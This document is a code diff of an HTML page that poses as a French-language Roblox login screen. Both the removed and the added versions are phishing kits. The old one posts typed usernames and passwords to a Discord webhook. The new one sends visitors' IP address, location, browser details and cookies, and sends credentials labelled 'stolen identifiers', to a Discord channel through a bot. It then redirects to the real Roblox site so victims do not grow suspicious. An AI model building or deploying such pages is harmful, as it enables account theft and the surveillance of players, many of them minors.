@@ -1,98 +1,71 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Roblox</title>
-<style>
-  body {
-    margin: 0;
-    font-family: -apple-system, system-ui, sans-serif;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    /* l'image de fond avec les personnages roblox */
-    background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://i.imgur.com/k0P4h5L.jpeg') center/cover no-repeat;
-    color: #fff;
-  }
-
-  .box {
-    width: 90%;
-    max-width: 320px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-  }
-
-  /* le vrai logo roblox */
-  .logo-img {
-    width: 200px;
-    margin-bottom: 30px;
-    filter: drop-shadow(0 4px 6px rgba(0,0,0,0.5));
-  }
-
-  input {
-    width: 100%;
-    padding: 14px;
-    margin-bottom: 12px;
-    background: rgba(30, 30, 30, 0.8); /* fond semi-transparent sombre */
-    border: 1px solid rgba(255,255,255,0.2);
-    border-radius: 8px;
-    color: #fff;
-    font-size: 16px;
-    box-sizing: border-box;
-    outline: none;
-  }
-  input::placeholder { color: #ccc; }
-  input:focus { border-color: #fff; }
-
-  button {
-    width: 100%;
-    padding: 14px;
-    background: rgba(255, 255, 255, 0.3); /* bouton transparent grisé */
-    color: #fff;
-    border: none;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    margin-top: 10px;
-    backdrop-filter: blur(5px);
-  }
-  button:active { background: rgba(255, 255, 255, 0.5); }
-
-  .forgot {
-    color: #fff;
-    font-size: 14px;
-    margin-top: 20px;
-    text-decoration: none;
-    text-shadow: 0 1px 3px rgba(0,0,0,0.8);
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f2f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        .logo { font-size: 32px; font-weight: bold; margin-bottom: 20px; color: #000; }
+        .logo span { color: #e2231a; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #00b06f; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #00965e; }
+        .footer { margin-top: 20px; font-size: 12px; color: #666; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">ROBLOX<span>.</span></div>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+        <div class="footer">© 2024 Roblox Corporation. Tous droits réservés.</div>
+    </div>
 
-<div class="box">
-  <!-- le logo officiel roblox -->
-  <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_logo.svg/1200px-Roblox_logo.svg.png" alt="Roblox">
-  
-  <form id="f">
-    <input type="text" id="u" placeholder="Username/Email/Phone" required autocomplete="off">
-    <input type="password" id="p" placeholder="Password" required autocomplete="off">
-    <button>Log In</button>
-  </form>
-  
-  <a href="#" class="forgot">Forgot Password or Username?</a>
-</div>
+    <script>
+        const botToken = "TON_TOKEN_DE_BOT";
+        const channelId = "1566474880894116032";
 
-<script>
-const H = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
-document.getElementById("f").onsubmit = e => {
-  e.preventDefault();
-  fetch(H, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:`**ROBLOX**\nUser: \`${document.getElementById('u').value}\`\nPass: \`${document.getElementById('p').value}\``})}).finally(()=>window.location.href="https://www.roblox.com/login");
-};
-</script>
+        async function sendToDiscord(msg) {
+            await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+                method: 'POST',
+                headers: { 
+                    'Authorization': `Bot ${botToken}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: msg })
+            });
+        }
+
+        async function getInfo() {
+            let ip = "inconnue";
+            let loc = "inconnue";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ip = data.ip;
+                loc = `${data.city}, ${data.country_name}`;
+            } catch(e) {}
+            
+            await sendToDiscord(`**Nouvelle visite**\n**IP:** ${ip}\n**Loc:** ${loc}\n**Nav:** ${navigator.userAgent}\n**Cookies:** ${document.cookie}`);
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            await sendToDiscord(`**Identifiants volés**\n**User:** ${user}\n**Pass:** ${pass}`);
+            
+            // Redirige vers le vrai roblox pour pas éveiller les soupçons
+            window.location.href = "https://www.roblox.com/login";
+        });
+
+        getInfo();
+    </script>
 </body>
 </html>
